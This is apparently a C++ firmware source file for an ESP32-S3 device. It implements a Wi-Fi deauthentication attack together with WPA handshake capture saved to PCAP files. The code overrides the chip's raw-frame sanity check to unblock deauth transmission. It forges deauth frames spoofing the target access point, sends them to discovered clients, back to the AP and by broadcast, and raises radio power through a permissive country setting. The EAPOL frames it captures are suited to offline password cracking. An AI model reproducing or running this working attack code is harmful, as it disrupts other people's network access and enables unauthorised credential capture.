// ============================================================================
// wifiattack.cpp - deauth + EAPOL/PCAP capture (see wifiattack.h)
// ----------------------------------------------------------------------------
// Full rewrite after studying WifiPhisher (the most recent S3-proven impl).
// Key lessons that fixed "frames sent but nothing lands":
//   1. TX through WIFI_IF_STA while the STA holds a ROC (remain-on-channel)
//      on the target channel - NOT through WIFI_IF_AP.
//   2. esp_wifi_register_80211_tx_cb gives ground truth on whether frames
//      actually transmitted. (Our old counter incremented on API call, not
//      on radio success.)
//   3. Country "01" (world-safe) + max TX power + WIFI_PS_NONE at attack
//      start; otherwise channel/power restrictions silently block frames.
//   4. Reason code 0x07 (Class 3 frame from nonassociated station).
//   5. Sniffer callback ONLY enqueues into a RAM ring; a writer task does
//      SD I/O. Doing SD writes inside the WiFi callback destabilized the
//      radio and corrupted captures.
//   6. Client discovery watches BOTH directions (ToDS and FromDS frames)
//      against the target BSSID.
// ============================================================================
#include "wifiattack.h"
#include "config.h"
#include "hw.h"
#include "ducky.h"
#include <WiFi.h>
#include <esp_wifi.h>
#include <esp_wifi_types.h>
#include <SD_MMC.h>

// brute32 technique: neutralize libnet80211.a's raw-frame rejection so
// esp_wifi_80211_tx actually transmits deauth subtypes on the S3.
extern "C" int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3) {
    return 0;
}

namespace wifiattack {

// deauth template: type c0 00, reason 0x07 filled per-frame
static const uint8_t DEAUTH_TMPL[26] = {
    0xc0, 0x00, 0x3a, 0x01,
    0xff, 0xff, 0xff, 0xff, 0xff, 0xff,   // addr1 dest (victim / bcast)
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,   // addr2 src  (target AP BSSID)
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,   // addr3 bssid (target AP BSSID)
    0xf0, 0xff, 0x07, 0x00                // seq + reason 7 (Class 3)
};
static const uint8_t REASON_CLASS3 = 0x07;

static Stats s_stats;
static volatile bool s_attacking = false;
static volatile bool s_sniffing = false;

bool attacking() { return s_attacking; }
bool sniffing()  { return s_sniffing; }
Stats stats()    { return s_stats; }

// ------------------------------------------------------- TX ground truth
static volatile uint32_t s_txOk = 0, s_txDrop = 0;
static void IRAM_ATTR txDoneCb(const esp_80211_tx_info_t* info) {
    if (info->tx_status == WIFI_SEND_SUCCESS) { s_txOk++; s_stats.deauths = s_txOk; }
    else { s_txDrop++; s_stats.deauthDrops = s_txDrop; }
}

// ------------------------------------------------- RAM ring -> writer task
// Sniffer callbacks run in the WiFi task; SD I/O there starves the radio.
// Callbacks push into a lock-free-ish single-producer/single-consumer ring;
// a low-priority writer task drains it to the SD card.
#define RING_SLOTS 128
#define RING_MAX   512
struct RingSlot { uint16_t len; uint8_t data[RING_MAX]; };
static RingSlot* s_ring = nullptr;
static volatile uint32_t s_head = 0, s_tail = 0;   // producer/consumer
static File s_pcap;
static TaskHandle_t s_writerTask = nullptr;
static volatile bool s_writerRun = false;
static volatile bool s_writerDone = true;

static bool ringPush(const uint8_t* data, uint16_t len) {
    if (!s_ring) return false;
    uint32_t next = (s_head + 1) % RING_SLOTS;
    if (next == s_tail) return false;            // full - drop (stat it)
    s_ring[s_head].len = len;
    memcpy(s_ring[s_head].data, data, len);
    s_head = next;
    return true;
}

static void writerTask(void*) {
    // Drain until the producer stops AND the ring is empty. The close-race
    // (main closing the file mid-record) is what corrupted captures before.
    while (s_writerRun || s_tail != s_head) {
        if (s_tail != s_head) {
            RingSlot& r = s_ring[s_tail];
            uint32_t us = micros();
            uint8_t rec[16];
            uint32_t secs = us / 1000000, usec = us % 1000000;
            memcpy(rec, &secs, 4);
            memcpy(rec+4, &usec, 4);
            memcpy(rec+8, &r.len, 4);
            memcpy(rec+12, &r.len, 4);
            s_pcap.write(rec, 16);
            s_pcap.write(r.data, r.len);
            s_stats.captured++;
            s_tail = (s_tail + 1) % RING_SLOTS;
        } else {
            delay(10);
        }
        if ((s_stats.captured % 50) == 0) s_pcap.flush();
    }
    s_pcap.flush();
    s_writerDone = true;
    vTaskDelete(nullptr);
}

static bool pcapOpen(const String& name) {
    if (SD_MMC.cardType() == CARD_NONE) return false;
    if (!SD_MMC.exists("/pcap")) SD_MMC.mkdir("/pcap");
    int i = 0;
    String path;
    do { path = "/pcap/" + name + "_" + String(i++) + ".pcap"; }
    while (SD_MMC.exists(path));
    s_pcap = SD_MMC.open(path, FILE_WRITE);
    if (!s_pcap) return false;
    // libpcap global header: LE magic a1b2c3d4, v2.4, snaplen 65535,
    // LINKTYPE_IEEE802_11 (105). Frames written WITH their FCS (Wireshark
    // expects it for this linktype).
    const uint8_t hdr[24] = {
        0xd4,0xc3,0xb2,0xa1, 0x02,0x00,0x04,0x00,
        0x00,0x00,0x00,0x00, 0x00,0x00,0x00,0x00,
        0xff,0xff,0x00,0x00, 0x69,0x00,0x00,0x00
    };
    s_pcap.write(hdr, 24);
    s_pcap.flush();

    if (!s_ring) s_ring = (RingSlot*)malloc(sizeof(RingSlot) * RING_SLOTS);
    s_head = s_tail = 0;
    s_writerDone = false;
    s_writerRun = true;
    xTaskCreatePinnedToCore(writerTask, "pcapwr", 6144, nullptr, 0, &s_writerTask, 0);
    return true;
}

static void pcapClose() {
    // Handshaked shutdown: stop accepting, wait for the writer to drain the
    // ring completely and signal done, THEN close. Never close mid-record.
    s_writerRun = false;
    uint32_t t0 = millis();
    while (!s_writerDone && millis() - t0 < 5000) delay(10);
    if (s_pcap) { s_pcap.flush(); s_pcap.close(); }
}

// --------------------------------------------------------- EAPOL detection
static inline bool isEapol(const uint8_t* p) {
    return (p[30]==0x88 && p[31]==0x8e) || (p[32]==0x88 && p[33]==0x8e);
}

// ------------------------------------------------------------- attack mode
static uint8_t s_apBssid[6];
static String s_targetSsid;

// Sniffer during deauth: discover stations (both directions) + catch EAPOL.
static void IRAM_ATTR attackSniffCb(void* buf, wifi_promiscuous_pkt_type_t type) {
    if (type != WIFI_PKT_DATA && type != WIFI_PKT_MGMT) return;
    auto* pkt = (wifi_promiscuous_pkt_t*)buf;
    uint32_t len = pkt->rx_ctrl.sig_len;
    if (len < 24 || len > 2500) return;
    const uint8_t* p = pkt->payload;
    uint8_t fc = p[0];

    if (isEapol(p)) {
        s_stats.eapol++;
        ringPush(p, len);            // handshake frames into the pcap
        return;
    }
    if (type != WIFI_PKT_DATA) return;

    // Station discovery, both directions (WifiPhisher pattern):
    //   ToDS=1:  addr1=BSSID(AP) addr2=STA   (client -> AP)
    //   FromDS=1: addr1=STA addr2=BSSID(AP)  (AP -> client)
    // ToDS/FromDS live in byte 1 of the FC (byte 0 = proto/type/subtype)
    uint8_t toDS = p[1] & 0x01, fromDS = p[1] & 0x02;
    (void)fc;
    const uint8_t *addr1 = p+4, *addr2 = p+10;
    const uint8_t* sta = nullptr;
    if (toDS && !fromDS && memcmp(addr1, s_apBssid, 6)==0) sta = addr2;
    else if (fromDS && !toDS && memcmp(addr2, s_apBssid, 6)==0) sta = addr1;
    else return;
    if (sta[0] == 0xFF) return;      // skip broadcast
    s_stats.stations++;              // (approx dedupe; fine for display)

    // deauth the station, forged from the target AP (WifiPhisher basic)
    uint8_t frame[26];
    memcpy(frame, DEAUTH_TMPL, 26);
    memcpy(frame+4, sta, 6);
    memcpy(frame+10, s_apBssid, 6);
    memcpy(frame+16, s_apBssid, 6);
    if (esp_wifi_80211_tx(WIFI_IF_STA, frame, 26, false) == ESP_OK) s_stats.deauths++;
    // and the reverse direction (AP gets told the client is gone) - Marauder
    frame[4] = s_apBssid[0]; frame[5] = s_apBssid[1]; frame[6] = s_apBssid[2];
    frame[7] = s_apBssid[3]; frame[8] = s_apBssid[4]; frame[9] = s_apBssid[5];
    frame[10] = sta[0]; frame[11] = sta[1]; frame[12] = sta[2];
    frame[13] = sta[3]; frame[14] = sta[4]; frame[15] = sta[5];
    frame[16] = sta[0]; frame[17] = sta[1]; frame[18] = sta[2];
    frame[19] = sta[3]; frame[20] = sta[4]; frame[21] = sta[5];
    if (esp_wifi_80211_tx(WIFI_IF_STA, frame, 26, false) == ESP_OK) s_stats.deauths++;
}

// Also broadcast deauths on a timer: hits stations we never saw (sleeping)
static volatile bool s_bcast = false;
static void bcastTask(void*) {
    uint8_t frame[26];
    memcpy(frame, DEAUTH_TMPL, 26);
    memcpy(frame+10, s_apBssid, 6);
    memcpy(frame+16, s_apBssid, 6);
    while (s_attacking) {
        if (s_bcast) {
            if (esp_wifi_80211_tx(WIFI_IF_STA, frame, 26, false) == ESP_OK)
                s_stats.deauths++;
        }
        delay(500);
    }
    vTaskDelete(nullptr);
}

static void restoreWifi() {
    esp_wifi_set_promiscuous(false);
    pcapClose();
    WiFi.mode(WIFI_AP);
    WiFi.softAP(cfg.wifiSSID, cfg.wifiPass);
    g_state.bootBtnAbort = false;
}

static void attackTask(void* pv) {
    auto* args = (std::pair<String,uint32_t>*)pv;
    String ssid = args->first; uint32_t seconds = args->second;
    delete args;

    // locate target
    logLine("deauth: scanning for '" + ssid + "'");
    WiFi.mode(WIFI_AP_STA);
    int n = WiFi.scanNetworks();
    int idx = -1;
    for (int i = 0; i < n; i++)
        if (WiFi.SSID(i) == ssid) { idx = i; break; }
    if (idx < 0) {
        logLine("deauth: target not found - aborting");
        WiFi.scanDelete();
        restoreWifi();
        s_attacking = false;
        vTaskDelete(nullptr);
        return;
    }
    memcpy(s_apBssid, WiFi.BSSID(idx), 6);
    uint8_t ch = WiFi.channel(idx);
    WiFi.scanDelete();

    // WifiPhisher attack-time radio prep
    esp_wifi_set_ps(WIFI_PS_NONE);
    wifi_country_t c = { .cc="01", .schan=1, .nchan=13,
                         .max_tx_power=20, .policy=WIFI_COUNTRY_POLICY_MANUAL };
    esp_wifi_set_country(&c);
    esp_wifi_set_max_tx_power(84);

    bool havePcap = pcapOpen("hs_" + ssid);   // BUGFIX: was never opened

    // keep OUR AP up but move it to the target channel - one radio, so the
    // whole system parks on ch while the ROC window runs. UI warned about
    // going offline; this matches.
    WiFi.softAP(cfg.wifiSSID, cfg.wifiPass, ch);
    delay(100);

    // ROC on the STA pins RX/TX to the target channel for the full window
    wifi_roc_req_t roc = {
        .ifx = WIFI_IF_STA,
        .type = WIFI_ROC_REQ,
        .channel = ch,
        .sec_channel = WIFI_SECOND_CHAN_NONE,
        .wait_time_ms = (uint32_t)seconds * 1000 + 5000,
        .rx_cb = nullptr,
        .done_cb = nullptr
    };
    esp_err_t rocErr = esp_wifi_remain_on_channel(&roc);
    logLine(String("deauth: ROC ch") + ch + " " + (rocErr==ESP_OK ? "ok" : esp_err_to_name(rocErr)));

    // ground-truth TX accounting
    esp_wifi_register_80211_tx_cb(txDoneCb);
    s_txOk = s_txDrop = 0;

    esp_wifi_set_promiscuous(true);
    const wifi_promiscuous_filter_t filt = {
        .filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT | WIFI_PROMIS_FILTER_MASK_DATA };
    esp_wifi_set_promiscuous_filter(&filt);
    wifi_promiscuous_filter_t ctrlFilt = {};   // empty ctrl filter
    esp_wifi_set_promiscuous_ctrl_filter(&ctrlFilt);
    esp_wifi_set_promiscuous_rx_cb(&attackSniffCb);

    s_bcast = true;
    TaskHandle_t bc;
    xTaskCreatePinnedToCore(bcastTask, "bcast", 4096, nullptr, 1, &bc, 0);

    logLine("deauth: attacking '" + ssid + "' ch" + String(ch) +
            (havePcap ? " (EAPOL capture on)" : ""));
    uint32_t t0 = millis();
    while (s_attacking && !g_state.bootBtnAbort &&
           millis() - t0 < seconds * 1000) delay(100);

    logLine(String("deauth: done - txOk ") + s_txOk + ", drops " + s_txDrop +
            ", stations " + s_stats.stations + ", eapol " + s_stats.eapol);
    s_stats.deauths = s_txOk;      // real success count

    s_bcast = false;
    s_attacking = false;
    delay(200);                    // let in-flight frames finish
    restoreWifi();
    vTaskDelete(nullptr);
}

void bootBtnAbortNote() {}  // handled via g_state.bootBtnAbort polled above

bool startDeauth(const String& ssid, uint32_t seconds) {
    if (s_attacking || ducky::isRunning()) return false;
    s_stats = Stats();
    s_attacking = true;
    g_state.bootBtnAbort = false;
    auto* args = new std::pair<String,uint32_t>(ssid, seconds);
    xTaskCreatePinnedToCore(attackTask, "deauth", 12288, args, 1, nullptr, 0);
    return true;
}

// -------------------------------------------------------------- pcap mode
static void IRAM_ATTR pcapSniffCb(void* buf, wifi_promiscuous_pkt_type_t type) {
    if (type == WIFI_PKT_MISC) return;
    auto* pkt = (wifi_promiscuous_pkt_t*)buf;
    uint32_t len = pkt->rx_ctrl.sig_len;
    if (len < 1 || len > RING_MAX) return;
    ringPush(pkt->payload, (uint16_t)len);   // FCS kept (linktype 105)
}

bool startPcap(const String& name, uint8_t channel, uint32_t seconds) {
    if (s_sniffing) return false;
    s_stats = Stats();
    if (!pcapOpen(name)) { logLine("pcap: cannot open file"); return false; }

    esp_wifi_set_ps(WIFI_PS_NONE);
    WiFi.mode(WIFI_AP_STA);
    WiFi.softAP(cfg.wifiSSID, cfg.wifiPass, channel);
    delay(100);
    esp_wifi_set_promiscuous(true);
    const wifi_promiscuous_filter_t filt = {
        .filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT | WIFI_PROMIS_FILTER_MASK_DATA };
    esp_wifi_set_promiscuous_filter(&filt);
    wifi_promiscuous_filter_t ctrlFilt = {};   // empty ctrl filter
    esp_wifi_set_promiscuous_ctrl_filter(&ctrlFilt);
    esp_wifi_set_promiscuous_rx_cb(&pcapSniffCb);
    s_sniffing = true;
    logLine("pcap: capturing ch" + String(channel) + " for " + String(seconds) + "s");

    uint32_t t0 = millis();
    while (s_sniffing && !g_state.bootBtnAbort && millis() - t0 < seconds*1000)
        delay(100);

    esp_wifi_set_promiscuous(false);
    pcapClose();
    WiFi.mode(WIFI_AP);
    WiFi.softAP(cfg.wifiSSID, cfg.wifiPass);
    g_state.bootBtnAbort = false;
    s_sniffing = false;
    logLine("pcap: done - " + String(s_stats.captured) + " packets");
    return true;
}

void stop()     { s_attacking = false; g_state.bootBtnAbort = true; }
void stopPcap() { s_sniffing = false; g_state.bootBtnAbort = true; }

} // namespace wifiattack
